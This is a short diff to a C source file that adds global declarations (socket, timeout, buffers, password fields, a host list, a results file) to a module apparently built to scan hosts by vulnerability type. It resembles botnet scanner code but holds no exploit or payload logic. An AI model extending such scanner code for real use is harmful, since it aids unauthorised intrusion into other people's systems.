@@ -21,6 +21,17 @@ int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req,
 int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req,
              unsigned short type); 
 
+static sock_t *scan_sp;
+static int timeout_value;
+static char __netbuf[sizebuf];
+static char psw_x[32], psw_y[32];
+static unsigned short founds;
+static char resbuf[21], restag[21];
+static char hosts[maxhosts][16];
+
+struct timeval tm;
+FILE *resfd;
+
 /* cmd_scan_central(sock_t *, requests_t *, unsigned short) */ 
 /* start scanner with vuln type.  */ 
 void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
